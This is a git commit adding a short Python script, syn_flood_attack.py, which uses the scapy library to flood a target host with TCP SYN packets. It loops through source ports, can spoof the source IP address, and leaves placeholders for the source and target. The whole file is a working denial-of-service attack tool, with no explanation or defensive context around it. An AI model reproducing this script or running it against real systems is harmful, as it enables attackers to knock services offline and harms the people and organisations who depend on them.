277ca907078dc675e04bbf9c5a0f36ce888d39f1
Jakob Hongwiset Kristensen <78535875+Hongwiset@users.noreply.github.com>
2021-02-04 18:13:53 +0100

    Add files via upload

---
+++ syn_flood_attack.py
@@ -0,0 +1,14 @@
+
+#!/usr/bin/python
+
+from scapy.all import *
+def synFlood(src, tgt):
+	for sport in range (1024, 65535):
+		L3 = IP(src=src, dst=tgt)
+		L4 = TCP(sport=sport , dport=1337)
+		pkt = L3/L4
+		send(pkt)
+
+src = "Insert_Source_Here"
+tgt = "Insert_Target_Here"
+synFlood(src, tgt)
